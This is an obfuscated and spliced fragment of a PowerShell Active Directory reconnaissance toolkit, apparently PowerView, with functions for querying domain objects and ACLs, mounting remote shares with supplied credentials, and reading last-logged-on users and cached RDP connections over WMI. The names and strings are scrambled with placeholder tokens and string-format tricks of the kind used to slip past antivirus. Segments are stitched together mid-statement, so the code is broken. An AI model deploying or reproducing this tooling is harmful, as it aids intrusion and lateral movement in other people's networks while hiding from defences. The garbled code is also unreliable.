        if (YoV{PSbOuNdPIJKArAIJKMeIJKTeRS}[(Z3b{3}{0}{4}{2}{1}Z3b-f S5zsulS5z,S5zeS5z,S5zgeSizS5z,S5zReS5z,S5ztPaS5z)]) { YoV{taIJKRGIJKeTIJKsEarcIJKhIJKeIJKRArGUmEntS}[(Z3b{2}{1}{0}Z3b-f S5zageSizeS5z,S5ztPS5z,S5zResulS5z)] = YoV{rESIJKUlIJKTIJKPaGeSize} }
        if (YoV{PSbouNIJKDpIJKAIJKRAIJKMeTErs}[(Z3b{1}{3}{0}{2}Z3b -fS5ziS5z,S5zServerTimeS5z,S5zmitS5z,S5zLS5z)]) { YoV{tAIJKRIJKgETSEArCheRaRguIJKmEIJKNts}[(Z3b{3}{2}{4}{1}{0}Z3b -f S5zLimitS5z,S5zeS5z,S5zerveS5z,S5zSS5z,S5zrTimS5z)] = YoV{sIJKeRvErIJKTIIJKmeLIJKimIT} }
        if (YoV{pSboUndpAIJKRIJKAMIJKETeRS}[(Z3b{0}{1}{2}Z3b -f S5zTombsS5z,S5ztonS5z,S5zeS5z)]) { YoV{tAIJKRGeTSIJKEArIJKChIJKERaRgUIJKmEntS}[(Z3b{1}{0}Z3b-fS5zstoneS5z,S5zTombS5z)] = YoV{tOIJKMbIJKsIJKTone} }
        if (YoV{PSIJKBOUNdIJKParAmEteIJKRs}[(Z3b{0}{3}{1}{2}Z3b-f S5zCrS5z,S5zntiS5z,S5zalS5z,S5zedeS5z)]) { YoV{TIJKARIJKGIJKEtsEaIJKRIJKchEIJKRARGumentS}[(Z3b{1}{0}{2}Z3b -fS5zedentS5z,S5zCrS5z,S5zialS5z)] = YoV{CIJKRIJKEdENtiAL} }

        YoV{PrINciIJKpaIJKLseIJKArchErIJKArGUmeNts} = @{
            (Z3b{0}{1}{2}Z3b-fS5zIdenS5z,S5ztitS5z,S5zyS5z) = YoV{PIJKRIJKInciPaLiDeIJKNTIty}
            (Z3b{1}{0}{2}Z3b','zTS5z,S5zrimS5z).Invoke() -ne S5zS5z) ) {
                YoV{fIIJKLIJKTer} += Z3b(JGOYoVIdentityFilter)Z3b
            }

            if (YoV{PSbOIJKUNDIJKpaRAMIJKeteIJKRs}[(Z3b{0}{2}{1}Z3b-fS5zLDAPFiS5z,S5zerS5z,S5zltS5z)]) {
                &(Z3b{3}{2}{0}{1}Z3b -f S5ze-VerS5z,S5zboseS5z,S5zritS5z,S5zWS5z) (S5z[Get-DomaS5z+S5zinS5z+S5zOS5z+S5zbject] S5z+S5zUsiS5z+S5zng S5z+S5zaS5z+S5zdS5z+S5zditionaS5z+S5zl S5z+S5zLDAPS5z+S5z S5z+S5zfS5z+S5zilteS5z+S5zr: S5z+Z3bYoVLDAPFilterZ3b)
                YoV{FIJKilTIJKer} += Z3bYoVLDAPFilterZ3b
            }

            
            YoV{uaIJKCIJKFIJKILter} JGO &(Z3b{0}{3}{2}{1}Z3b -f S5zWS5z,S5zjectS5z,S5zObS5z,S5zhere-S5z) {YoV{_}} JGO &(Z3b{1}{0}{2}{3}Z3b-f S5zch-S5z,S5zForEaS5z,S5zObjeS5z,S5zctS5z) {
                if (YoV{_} -match (Z3b{0}{1}{2}Z3b-fS5zNS5z,S5zOT_S5z,S5z.*S5z)) {
                    YoV{UacIJKFIElD} = YoV{_}.(Z3b{0}{1}{2}Z3b -f S5zSubS5z,S5zstrinS5z,S5zgS5z).Invoke(4)
                    YoV{UAIJKcVIJKALuE} = [Int](YoV{uIJKAceNIJKUm}::YoV{UaIJKCFIJKield})
                    YoV{fIJKIIJKLter} += Z3b(!(userAccountControl:1.2.840.113556.1.4.803:=YoVUACValue))Z3b
                }
                else {
                    YoV{UAIJKcvaLuE} = [Int](YoV{uIJKACEnIJKUm}::YoV{_})
                    YoV{FIJKiIJKLtEr} += Z3b(userAccountControl:1.2.840.113556.1.4.803:=YoVUACValue)Z3b
                }
            }

            if (YoV{FIJKiIJKLTeR} -and YoV{fIJKilTIJKEr} -ne S5zS5z) {
                YoV{oBjIJKectSeAIJKRChIJKer}.Z3bfIJKiIJKlTERZ3b = Z3b(&YoVFilter)Z3b
            }
            &(Z3b{1}{3}{2}{0}Z3b -fS5zseS5z,S5zWS5z,S5z-VerboS5z,S5zriteS5z) Z3b[Get-DomainObject] Get-DomainObject filter string: YoV(YoVObjectSearcher.filter) Z3b

            if (YoV{pIJKSIJKBOUIJKNDPARamEtEIJKRs}[(Z3b{1}{0}{2}Z3b -f S5znS5z,S5zFindOS5z,S5zeS5z)]) { YoV{rEsIJKULIJKTS} = YoV{OBJECtsIJKEaIJKRcHIJKER}.(Z3b{0}{1}Z3b -fS5zFindOnS5z,S5zeS5z).Invoke() }
            else { YoV{reSuIJKltS} = YoV{objeIJKcIJKTIJKseaRCHeR}.(Z3b{0}{1}Z3b-fS5zFindS5z,S5zAllS5z).Invoke() }
            YoV{RIJKEIJKSUltS} JGO &(Z3b{0}{3}{1}{2}Z3b-fS5zWhereS5z,S5zbS5z,S5zjectS5z,S5z-OS5z) {YoV{_}} JGO &(Z3b{4}{2}{0}{3}{1}Z3b -f S5zch-OS5z,S5zctS5z,S5zrEaS5z,S5zbjeS5z,S5zFoS5z) {
                if (YoV{psIJKBOIJKUnIJKdPIJKARAMeIJKTeRS}[S5zRawS5z]) {
                    
                    YoV{oIJKBJECT} = YoV{_}
                    YoV{oBIJKJEIJKcT}.Z3bPSIJKOBjIJKECtZ3b.Z3bTYIJKPIJKENamEsZ3b.(Z3b{0}{1}Z3b -fS5zInseS5z,S5zrtS5z).Invoke(0, (Z3b{2}{3}{0}{4}{1}Z3b-f S5zADS5z,S5zect.RawS5z,S5zPowerViewS5z,S5z.S5z,S5zObjS5z))
                }
                else {
                    YoV{OBjIJKEIJKCT} = &(Z3b{4}{3}{1}{2}{0}Z3b -f S5zyS5z,S5z-LDAPProperS5z,S5ztS5z,S5zvertS5z,S5zConS5z) -Properties YoV{_}.Z3bPIJKRopeIJKRTIEsZ3b
                    YoV{oBJIJKECT}.Z3bPIJKsIJKobJecTZ3b.Z3bTYpIJKeNIJKAmESZ3b.(Z3b{1}{0}Z3b-f S5znsertS5z,S5zIS5z).Invoke(0, (Z3b{5}{1}{2}{3}{4}{0}Z3b-fS5ztS5z,S5zViS5z,S5zew.ADOS5z,S5zbjeS5z,S5zcS5z,S5zPowerS5z))
                }
                YoV{ObIJKjEcT}
            }
            if (YoV{reIJKsults}) {
                try { YoV{rEIJKsUlIJKTS}.(Z3b{0}{1}Z3b -f S5zdispoS5z,S5zseS5z).Invoke() }
                catch {
                    &(Z3b{2}{0}{1}Z3b-fS5zte-VerboS5z,S5zseS5z,S5zWriS5z) (S5z[Get-S5z+S5zDomaS5z+S5ziS5z+S5znObject]','3bYoV_Z3b)
            }
        }
        else {
            &(Z3b{1}{0}{3}{2}{4}Z3b-fS5zite-WS5z,S5zWrS5z,S5zinS5z,S5zarnS5z,S5zgS5z) (S5z[Set-DomaiS5z+S5znUsS5z+S5zerPaS5z+S5zssS5z+S5zword] S5z+S5zUnaS5z+S5zbleS5z+S5z S5z+S5ztS5z+S5zo S5z+S5zfindS5z+S5z S5z+S5zuseS5z+S5zr S5z+Z3bS5zYoVIdentityS5zZ3b)
        }
    }
}


function gIJKEIJKT-dOMaIIJKNusEREvent {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{0}{3}{2}{1}Z3b -fS5zPS5z,S5zdProcessS5z,S5zShoulS5z,S5zSS5z}, S5zS5z)]
    [OutputType({Z3b{4}{3}{1}{0}{2}Z3b-f S5zw.LogoS5z,S5zieS5z,S5znEventS5z,S5zrVS5z,S5zPoweS5z})]
    [OutputType({Z3b{0}{3}{7}{6}{4}{5}{2}{1}Z3b -fS5zPS5z,S5zventS5z,S5znES5z,S5zoweS5z,S5zalLS5z,S5zogoS5z,S5zExplicitCredentiS5z,S5zrView.S5z})]
    [CmdletBinding()]
    Param(
        [Parameter(positIOn = 0, ValueFRompipElIne = YoV{tRIJKUE}, valueFrOmPipeLinEbyPROPerTynAmE = YoV{tRIJKUe})]
        [Alias({Z3b{0}{2}{1}Z3b -fS5zdS5z,S5znameS5z,S5znshostS5z}, {Z3b{2}{1}{0}Z3b-fS5ztNameS5z,S5zosS5z,S5zHS5z}, {Z3b{0}{1}Z3b-f S5znS5z,S5zameS5z})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{cIJKoMputeRnIJKAME} = YoV{EnIJKV:coIJKMpIJKUTIJKErnIJKAme},

        [ValidateNotNullOrEmpty()]
        [D','FromNameS5z,S5ziS5z,S5zSS5z,S5zessS5z) YoV{NuIJKLl}

                                    
                                    if (YoV{cHIJKecIJKKIJKACCess}) {
                        ','= Z3bDIJKynIJKAMIJKIcPARamEtERZ3b)]
        [switch]YoV{dIJKONtSHOw},

        [Parameter(ValuEfROmpipeLInebypROpertyNAme = YoV{TIJKRUE}, ParAMeteRSETNAMe = Z3bdynIJKAmicIJKpArIJKAMeteRZ3b)]
        [switch]YoV{vALuEfIJKRoMpIIJKpeIJKLINe},

        [Parameter(VALuEFrOMpiPELinEBYPRoperty','esIJKTinIJKgIJKAcl} JGO &(Z3b{0}{1}{2}Z3b-f S5zAdd-MemS5z,S5zbS5z,S5zerS5z) (Z3b{3}{2}{0}{1}Z3b -fS5zroperS5z,S5ztyS5z,S5zPS5z,S5zNoteS5z) (Z3b{0}{1}Z3b -f S5zAceTyS5z,S5zpeS5z) YoV{_}.Z3bACeTIJKyIJKpEZ3b
                        YoV{iIJKNtereSIJKTIJKiNgAcl} JGO &(Z3b{1}{3}{2}{0}Z3b -f S5zmberS5z,S5zAddS5z,S5zeS5z,S5z-MS5z) (Z3b{1}{0}{2}{3}Z3b-fS5zPropeS5z,S5zNoteS5z,S5zrtS5z,S5zyS5z) (Z3b{1}{4}{2}{0}{3}Z3b-f S5zanceS5z,S5zIS5z,S5zritS5z,S5zFlagsS5z,S5znheS5z) YoV{_}.Z3binhEIJKRIJKItAIJKNCEIJKFlaGSZ3b
                        YoV{inIJKTEreSTiIJKNgIJKAIJKcl} JGO &(Z3b{0}{2}{1}Z3b -fS5zAdd-MeS5z,S5zberS5z,S5zmS5z) (Z3b{2}{0}{1}Z3b-f S5ztS5z,S5zyS5z,S5zNoteProperS5z) (Z3b{0}{3}{2}{1}{4}Z3b -f S5zSS5z,S5ztS5z,S5ziS5z,S5zecurS5z,S5zyIdentifierS5z) YoV{_}.Z3bsECuIJKRITyIJKIDIJKenTiIJKFIerZ3b
                        YoV{iNtEIJKReSTIngIJKAIJKCL} JGO &(Z3b{0}{3}{1}{2}Z3b-fS5zAdd-S5z,S5zeS5z,S5zrS5z,S5zMembS5z) (Z3b{2}{1}{0}{3}Z3b-f S5zropeS5z,S5zePS5z,S5zNotS5z,S5zrtyS5z) (Z3b{4}{0}{2}{3}{1}Z3b-fS5zRS5z,S5zameS5z,S5zefereS5z,S5znceNS5z,S5zIdentityS5z) YoV{IDeNTITyrIJKEIJKFeRenCeNIJKAIJKME}
                        YoV{intIJKerEstIJKInGaCl} JGO &(Z3b{1}{0}{2}Z3b-f S5zdd-MembeS5z,S5zAS5z,S5zrS5z) (Z3b{1}{3}{0}{2}Z3b-fS5zrS5z,S5zNS5z,S5ztyS5z,S5zotePropeS5z) (Z3b{2}{1}{5}{0}{4}{3}Z3b-fS5zDoS5z,S5zeS5z,S5zIdentityReferS5z,S5znS5z,S5zmaiS5z,S5znceS5z) YoV{ideNtIJKiTIJKyIJKREIJKFEreNcIJKeDIJKOIJKMaIN}
                        YoV{inTIJKeReSIJKTIJKingaCl} JGO &(Z3b{1}{0}{2}Z3b -f S5zd-S5z,S5zAdS5z,S5zMemberS5z) (Z3b{2}{3}{0}{1}Z3b-f S5zopS5z,S5zertyS5z,S5zNoS5z,S5ztePrS5z) (Z3b{1}{0}{4}{2}{3}Z3b-f S5zdentityReS5z,S5zIS5z,S5znceDS5z,S5zNS5z,S5zfereS5z) YoV{idENTIJKITIJKyrEfIJKEreIJKNIJKCEIJKdn}
                        YoV{iNtIJKERESTiIJKNIJKgAcl} JGO &(Z3b{1}{0}{2}{3}Z3b-fS5zbS5z,S5zAdd-MemS5z,S5zeS5z,S5zrS5z) (Z3b{3}{0}{2}{1}Z3b-fS5zPrS5z,S5ztyS5z,S5zoperS5z,S5zNoteS5z) (Z3b{2}{1}{3}{4}{0}Z3b -f S5zassS5z,S5zntityS5z,S5zIdeS5z,S5zRefS5z,S5zerenceClS5z) YoV{IdENIJKTiTIJKYIJKREIJKFErenceIJKCLAIJKss}
                        YoV{INTeRIJKEIJKstINgIJKAcl}
                    }
                    else {
                        YoV{IdIJKENTiIJKTYReFErIJKeNcEDN} = &(Z3b{1}{2}{4}{3}{0}Z3b -f S5zameS5z,S5zCoS5z,S5znvertS5z,S5zADNS5z,S5z-S5z) -Identity YoV{_}.Z3bseIJKcIJKURityIJKIdIJKenIJKTIfIerZ3b.Z3bVALIJKUeZ3b -OutputType (S5zDNS5z) @ADNameArguments
                        

                        if (YoV{IDENtiTYIJKRIJKeferIJKENcIJKEIJKDn}) {
                            YoV{iIJKdeIJKNtitYrEIJKFEReNIJKCEIJKDoIJKMAiN} = YoV{idEntIJKItYREIJKFEIJKReNCedN}.(Z3b{1}{2}{0}Z3b-f S5zgS5z,S5zSubS5z,S5zStrinS5z).Invoke(YoV{iDenIJKTiIJKTyrIJKEFerenCEIJKDn}.(Z3b{1}{0}Z3b -f S5zOfS5z,S5zIndexS5z).Invoke(S5zDC=S5z)) -replace S5zDC=S5z,S5zS5z -replace S5z,S5z,S5z.S5z
                            
                            YoV{ObIJKJIJKEIJKcTSEaIJKRcHIJKeraIJKRguMEIJKNTs}[(Z3b{0}{1}Z3b-fS5zDomaS5z,S5zinS5z)] = YoV{iIJKdEntiIJKTIJKYrEfIJKEreIJKNCIJKeDOMaIJKIN}
                            YoV{oBJeCIJKTIJKSeaRCHerarIJKGUmIJKENIJKTS}[(Z3b{2}{0}{1}Z3b-fS5zdenS5z,S5ztityS5z,S5zIS5z)] = YoV{ideNTItIJKYReFIJKeIJKRenIJKC','numeS5z+S5zratedS5z+S5z S5z+S5zforeS5z+S5zstS5z+S5z S5z+Z3bS5zYoVTargetForestS5z Z3b+S5zfS5z+S5zor S5z+S5ztaS5z+S5zrgetS5z+S5z S5z+S5zdS5z+S5zomainS5z+S5z S5z+Z3bS5zYoVDomainS5zZ3b)
        }

        YoV{schIJKemIJKAaRGUmEnIJKTs} = @{}
        if (YoV{pIJKsbouNdPARIJKAIJKmETerS}[(Z3b{1}{0}{2}Z3b -fS5zrS5z,S5zCS5z,S5zedentialS5z)]) { YoV{scHEmaarIJKguIJKmENts}[(Z3b{1}{0}{2}Z3b-fS5zedentiaS5z,S5zCrS5z,S5zlS5z)] = YoV{cRedEIJKNTIJKIIJKAl} }
        if (YoV{TIJKAIJKRgetForeSt}) {
            YoV{sChIJKeMaarGIJKUIJKMenTs}[(Z3b{1}{0}Z3b-fS5ztS5z,S5zForesS5z)] = YoV{TaRgIJKETFoRIJKEIJKst}
        }
    }

    PROCESS {

        if (YoV{pIJKsBouNIJKDIJKPIJKAraMEters}[(Z3b{1}{0}{3}{4}{5}{2}Z3b-fS5zefeS5z,S5zRS5z,S5zertySetS5z,S5zreS5z,S5zncePrS5z,S5zopS5z)]) {
            &(Z3b{2}{0}{3}{4}{1}Z3b -f S5ziS5z,S5zboseS5z,S5zWrS5z,S5zteS5z,S5z-VerS5z) (Z3b{17}{14}{11}{6}{16}{12}{1}{8}{7}{2}{15}{10}{5}{4}{0}{9}{13}{3}{18}Z3b-fS5zd -S5z,S5zecS5z,S5ztlS5z,S5ztySeS5z,S5zecifieS5z,S5zspS5z,S5zmaS5z,S5zpertyOuS5z,S5ztProS5z,S5zRefS5z,S5zer] Using S5z,S5zDoS5z,S5zbjS5z,S5zerenceProperS5z,S5zFind-S5z,S5ziS5z,S5zinOS5z,S5z[S5z,S5ztS5z)
            YoV{RIJKEfIJKErenCeOBIJKjEIJKCTIJKprOpeRtIJKIeS} = YoV{ReFEreIJKNcePrIJKOpIJKerTYIJKset}
        }
        elseif (YoV{pSbOUnIJKDIJKpaRAmIJKEtIJKerS}[(Z3b{4}{2}{0}{1}{3}Z3b -fS5zeS5z,S5znceObS5z,S5zrS5z,S5zjectS5z,S5zRefeS5z)]) {
            &(Z3b{1}{0}{2}Z3b -fS5zeS5z,S5zWritS5z,S5z-VerboseS5z) (Z3b{4}{6}{10}{11}{1}{2}{15}{18}{13}{9}{14}{0}{3}{7}{5}{8}{17}{12}{16}Z3b-f S5zefeS5z,S5ztPS5z,S5zropertyOutlier] ES5z,S5zrenS5z,S5z[FiS5z,S5zt to useS5z,S5znd-DS5z,S5zceObjecS5z,S5z as the referenceS5z,S5zes fS5z,S5zoS5z,S5zmainObjecS5z,S5zpropS5z,S5zerty namS5z,S5zrom -RS5z,S5zxtractS5z,S5zerty setS5z,S5z S5z,S5zing propS5z)
            YoV{REFERIJKENCeOBjIJKeIJKctIJKPROPIJKErTiIJKes} = &(Z3b{1}{0}{2}Z3b-fS5zet-S5z,S5zGS5z,S5zMemberS5z) -InputObject YoV{rEFIJKeIJKREncIJKeoBjEIJKct} -MemberType (Z3b{1}{3}{2}{0}Z3b-f S5zrtyS5z,S5zNoteS5z,S5zeS5z,S5zPropS5z) JGO &(Z3b{0}{3}{1}{4}{2}Z3b-f S5zSelect-S5z,S5zbS5z,S5ztS5z,S5zOS5z,S5zjecS5z) -Expand (Z3b{0}{1}Z3b-fS5zNaS5z,S5zmeS5z)
            YoV{rEfERIJKeIJKNceIJKOBjECtCLIJKAIJKSs} = YoV{RefIJKeIJKRENIJKCEobJeIJKCT}.Z3bobJeIJKcIJKTCIJKlassZ3b JGO &(Z3b{1}{4}{0}{3}{2}Z3b -f S5zctS5z,S5zSS5z,S5zObjectS5z,S5z-S5z,S5zeleS5z) -Last 1
            &(Z3b{2}{3}{1}{0}Z3b-fS5zboseS5z,S5zVerS5z,S5zWritS5z,S5ze-S5z) (S5z[S5z+S5zFinS5z+S5zd-DomainOb','5z) = YoV{tArgEt_IJKLIJKIst}
                }
                YoV{oBJeCt_IJKlIIJKsT} += &(Z3b{0}{2}{3}{1}Z3b-f S5zNS5z,S5ztS5z,S5zew-OS5z,S5zbjecS5z) -TypeName (Z3b{1}{0}Z3b-f S5zbjectS5z,S5zPSOS5z) -Property YoV{DFsIJK_IJKPIJKKTIJK_propERtIEs}
                YoV{pIJKREFIJKIx} = YoV{nuIJKll}
                YoV{bIJKLoIJKB_NIJKAmE} = YoV{nUIJKll}
                YoV{tIJKAIJKRGEIJKT_lIST} = YoV{nIJKUlL}
            }

      ','RaIJKMEter','-fS5zopertiS5z,S5zPrS5z,S5zesS5z) = (Z3b{0}{8}{4}{7}{2}{6}{5}{1}{3}Z3b-fS5zdistiS5z,S5zectsiS5z,S5zdname,S5z,S5zdS5z,S5zuisS5z,S5zbjS5z,S5zoS5z,S5zheS5z,S5zngS5z)
        }
        if (YoV{pSbIJKOUnDpAIJKRaMEtIJKEIJKRs}[(Z3b{3}{0}{2}{4}{1}Z3b-f S5zrincipS5z,S5zinS5z,S5zalDoS5z,S5zPS5z,S5z',' if (YoV{foIJKUnDfOIJKREIJKsT}) {
            YoV{FIJKOIJKUnDFoIJKRESt}.(Z3b{3}{5}{6}{0}{2}{1}{4','KRgIJKEtPAIJKTH} in YoV{PAtIJKHs}) {
            YoV{NeTreIJKSIJKouRCEINsIJKTancE}.Z3bLprIJKeIJKMOTeNaMEZ3b = YoV{TARGETIJKPIJKATH}
            &(Z3b{1}{2}{3}{0}Z3b -fS5zeS5z,S5zWriS5z,S5zte-VeS5z,S5zrbosS5z) (S5z[Add-RemoS5z+S5zteS5z+S5zConneS5z+S5zcS5z+S5ztion] S5z+S5zAS5z+S5zttS5z+S5zemptiS5z+S5zng S5z+S5ztS5z+S5zo S5z+S5zmountS5z+S5z: S5z+Z3bYoVTargetPathZ3b)

            
            
            YoV{reSIJKUlT} = YoV{mIJKPR}::(Z3b{3}{4}{1}{2}{5}{0}Z3b-f S5zWS5z,S5zddConS5z,S5znectionS5z,S5zWNeS5z,S5ztAS5z,S5z2S5z).Invoke(YoV{nIJKETrEsOIJKUrCIJKeinIJKsIJKTaNCe}, YoV{CrEDIJKENtIJKiaL}.(Z3b{1}{2','rS5z) @SearcherArguments
    }

    PROCESS {
        if (YoV{GROUIJKPsEIJKARCHEr}) {
            if (YoV{pIJKsIJKBoUNdpArAIJKmIJKETeRs}[(Z3b{1}{2}{0}{3}Z3b-f S5zdentS5z,S5zMembS5z,S5zerIS5z,S5zityS5z)]) {

                if (YoV{sIJKEAIJKRcHeIJKRARGUmeIJKNTS}[(Z3b{1}{0}{2}Z3b -fS5zropeS5z,S5zPS5z,S5zrtiesS5z)]) {
                    YoV{OIJKLIJKdPRopIJKErtIes} = YoV{sEAIJKRCIJKheRaRgUmeIJKNts}[(Z3b{3}{2}{0}{1}Z3b -fS5ziS5z,S5zesS5z,S5ztS5z,S5zProperS5z)]
                }

                YoV{sIJKEIJKARChIJKERaRGuMeNIJKTs}[(Z3b{1}{0}{2}Z3b-f S5zentS5z,S5zIdS5z,S5zityS5z)] = YoV{MemBeIJKRiIJKdenIJKTItY}
                YoV{sIJKEarcIJKHIJKErArg','          YoV{tARGEtdIJKOIJKmAIJKin} = YoV{diSIJKTIJKINguIJKisHEdnIJKAme}.(Z3b{1}{2}{0}Z3b-f S5zringS5z,S5zSubSS5z,S5ztS5z).Invoke(3, YoV{TIJKARgEtIJKNaMIJKEiNDEx}-3)
                    }
                    else {
                        YoV{TarIJKGEIJKTDOIJKmAIN} = Z3bZ3b
                    }

                    YoV{OIJKBJEcTGuIJKid} = &(Z3b{1}{0}{2}{3}Z3b -f S5zw-ObjS5z,S5zNeS5z,S5zeS5z,S5zctS5z) (Z3b{0}{1}Z3b -f S5zGuS5z,S5zidS5z) @(,YoV{pIJKRoPS}.Z3boBIJKjeIJKctIJKGuIdZ3b[0])
                    YoV{TargEtIJKSIJKiD} = (&(Z3b{2}','5z+S5zforS5z+S5z S5z+Z3bYoVComputerName Z3b+S5z: S5z+Z3bYoV_Z3b)
            }
        }
    }
}


function gETIJK-wmIJKIrIJKEgLaIJKstLIJKoIJKggeDON {


    [OutputType({Z3b{2}{4}{6}{3}{0}{1}{5}Z3b-fS5zOS5z,S5znS5z,S5zPowerVS5z,S5zdS5z,S5ziew.LaS5z,S5zUserS5z,S5zstLoggeS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSitioN = 0, vaLuEfROmPIPeLIne = YoV{TRIJKUE}, VAluefRompIpelinebypROPeRtYNAME = YoV{tRIJKUE})]
        [Alias({Z3b{0}{1}Z3b -f S5zHostNamS5z,S5zeS5z}, {Z3b{2}{1}{0}Z3b -f S5zhostnameS5z,S5znsS5z,S5zdS5z}, {Z3b{1}{0}Z3b-f S5zeS5z,S5znamS5z})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{COIJKmPIJKUIJKTErnaMe} = (Z3b{0}{2}{1}Z3b-fS','{2}{1}{3}{0}Z3b-fS5','3b{1}{0}Z3b-fS5zDS5z,S5zGUIS5z})]
     ','z,S5zmeS5z})]
        [String[]]
        YoV{iDIJKEIJKNTIJKitY},

        [Switch]
        YoV{ReIJKSolIJKVEMEmBEIJKRIJKsIJKTosIdS},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{dOIJKmIJKAin},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}Z3b -fS5zFiS5z,S5zlterS5z})]
        [String]
        YoV{lIJKdIJKAPFiltEr},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}Z3b-fS5zADS5z,S5zSPathS5z})]
        [String]
        YoV{SIJKEIJKARchbAse},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}{3}{4}{2}Z3b-fS5zDomainS5z,S5zCS5z,S5zlerS5z,S5zoS5z,S5zntrolS5z})]
        [String]
        YoV{SEIJKRIJKVER},

        [ValidateSet({Z3b{1}{0}Z3b -f S5zeS5z,S5zBasS5z}, {Z3b{0}{2}{1}Z3b -fS5zOS5z,S5zevelS5z,S5zneLS5z}, {Z3b{2}{1}{0}Z3b-fS5zeS5z,S5ztreS5z,S5zSubS5z})]
        [String]
        YoV{SeIJKArcHscIJKOIJKpe} = (Z3b{0}{1}Z3b-fS5zSubtS5z,S5zreeS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{rEIJKSUIJKltpageIJKSiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{SERVerIJKTimIJKeIJKlImIt},

        [Switch]
        YoV{TomBIJKstoIJKNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{cIJKREDeIJKNtiAl} =   (  &(S5zGIS5z)  varIaBle:jfi).Z3bVALIJKUeZ3b::Z3bEMPIJKTYZ3b
    )

    BEGIN {
        YoV{SEArcIJKhErarguIJKmENIJKTs} = @{}
        if (YoV{PsBIJKoIJKUNDIJKpIJKARAMeIJKTERS}[(Z3b{2}{0}{1}Z3b-fS5zmaS5z,S5zinS5z,S5zDoS5z)]) { YoV{sIJKeArCHEIJKRIJKARGuMeIJKNtS}[(Z3b{2}{1}{0}Z3b -f S5zinS5z,S5zomaS5z,S5zDS5z)] = YoV{DIJKOIJKmain} }
        if (YoV{psIJKBIJKOuIJKNDpIJKAramEteIJKRs}[(Z3b{2}{0}{1}Z3b-f S5zDS5z,S5zAPFilterS5z,S5zLS5z)]) { YoV{sIJKEArchIJKErIJKARgIJKUIJKments}[(Z3b{1}{2}{0}Z3b-f S5zFilterS5z,S5zLS5z,S5zDAPS5z)] = YoV{DIJKomain} }
        if (YoV{pIJKSbOIJKUnDpARamETEIJKRS}[(Z3b{1}{0}{2}Z3b -f S5zrS5z,S5zSeaS5z,S5zchBaseS5z)]) { YoV{SIJKeArCHERaIJKRgIJKUmIJKENTS}[(Z3b{1}{2}{0}Z3b -f S5zeS5z,S5zSS5z,S5zearchBasS5z)] = YoV{SEIJKArChBIJKAIJKSe} }
        if (YoV{PsBIJKouNDPARaMEtIJKEIJKRs}[(Z3b{2}{1}{0}Z3b-fS5zverS5z,S5zerS5z,S5zSS5z)]) { YoV{seArCIJKHEraRGUIJKmIJKeNIJKTs}[(Z3b{1}{0}Z3b -f S5zerS5z,S5zServS5z)] = YoV{sIJKerVIJKer} }
        if (YoV{PsBOIJKUNIJKDparIJKAMIJKETErS}[(Z3b{1}{0}{2}Z3b-f S5zarchScoS5z,S5zSeS5z,S5zpeS5z)]) { YoV{seARCIJKHEIJKRaRGUMEIJKNTs}[(Z3b{3}{2}{0}{1}Z3b-fS5zopS5z,S5zeS5z,S5zhScS5z,S5zSearcS5z)] = YoV{SeArCHsIJKCoIJKPE} }
        if (YoV{PsbIJKoUIJKNDpIJKAIJKRaMIJKEters}[(Z3b{3}{1}{0}{2}Z3b -f S5zSS5z,S5zPageS5z,S5zizeS5z,S5zResultS5z)]) { YoV{SIJKeaRCHERaIJKRgUMIJKEIJKNIJKTS}[(Z3b{0}{3}{4}{1}{2}Z3b -fS5zResS5z,S5zeSS5z,S5zizeS5z,S5zultPS5z,S5zagS5z)] = YoV{RESIJKUltPAIJKgIJKEI','zmberS5z,S5zAddS5z,S5zMeS5z) (Z3b{2}{0}{3}{1}Z3b-fS5zrS5z,S5zyS5z,S5zNotepropeS5z,S5ztS5z) (Z3b{1}{2}{0}{3}Z3b -fS5ztServeS5z,S5zTaS5z,S5zrgeS5z,S5zrS5z) YoV{serVIJKer}
                            YoV{FIJKOunIJKdCOnIJKNECTIIJKOn} JGO &(Z3b{3}{1}{2}{0}Z3b -fS5zmberS5z,S5z-S5z,S5zMeS5z,S5zAddS5z) (Z3b{1}{2}{0}Z3b-fS5ztepropertyS5z,S5zNS5z,S5zoS5z) (Z3b{0}{1}{2}Z3b-f S5zUS5z,S5zsernS5z,S5zameHintS5z) YoV{uSIJKERIJKNIJKAmIJKehINT}
                            YoV{FIJKoIJKUIJKNdcOnNeCtIOn}.Z3bpIJKSIJKobjecTZ3b.Z3bTYpeIJKNAmIJKEsZ3b.(Z3b{0}{1}Z3b -f S5zInseS5z,S5zrtS5z).Invoke(0, (Z3b{4}{2}{3}{5}{0}{1}Z3b -fS5zDPCS5z,S5zonnectionS5z,S5zowerVS5z,S5ziew.CS5z,S5zPS5z,S5zachedRS5z))
                            YoV{FoUNIJKdCoIJKNNIJKECtIJKion}
                        }
                    }
                    catch {
                        &(Z3b{2}{1}{0}Z3b-fS5zseS5z,S5zte-VerboS5z,S5zWriS5z) (S5z[GeS5z+S5ztS5z+S5z-S5z+S5zWMIRegCS5z+S5zachS5z+S5zedRDS5z+S5zPCS5z+S5zonnecS5z+S5ztion] S5z+S5zErrorS5z+S5z: S5z+Z3bYoV_Z3b)
                    }
                }
            }
            catch {
                &(Z3b{0}{1}{2}{3}Z3b -fS5zWritS5z,S5ze-WS5z,S5zarnS5z,S5zingS5z) (S5z[Get-S5z+S5zWS5z+S5zMIRegS5z+S5zCS5z+S5zaS5z+S5zcheS5z+S5zdRDPCoS5z+S5znnectiS5z+S5zoS5z+S5zn] S5z+S5zErrorS5z+S5z S5z+S5zaS5z+S5zccessiS5z+S5zng S5z+Z3bYoVComputer, Z3b+S5zlikelS5z+S5zy S5z+S5ziS5z+S5znS5z+S5zsufficiS5z+S5zent S5z+S5zpermisS5z+S5zsiS5z+S5zonsS5z+S5z S5z+S5zoS5z+S5zr S5z+S5zfirS5z+S5zewalS5z+S5zl S5z+S5zrS5z+S5zules S5z+S5zoS5z+S5zn S5z+S5zhoS5z+S5zst: S5z+Z3bYoV_Z3b)
            }
        }
    }
}

